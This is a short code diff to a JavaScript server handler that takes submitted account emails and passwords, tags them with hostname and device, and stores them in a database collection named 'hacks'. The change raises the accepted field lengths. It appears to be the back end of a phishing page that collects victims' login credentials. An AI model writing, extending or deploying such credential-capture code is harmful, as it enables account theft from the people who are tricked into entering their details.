@@ -24,8 +24,8 @@ export async function post(req) {
     inputData["hostname"] = 'www.'+req.url.hostname;
     inputData["device"] = getUserDevice(req.request.agent);
     if (
-        inputData["input_account_email"].length < 30 &&
-        inputData["input_account_password"].length < 26
+        inputData["input_account_email"].length < 70 &&
+        inputData["input_account_password"].length < 70
     ) {
         try {
             let res=await setDoc(doc(db, "hacks", timestamp.toString()), inputData);
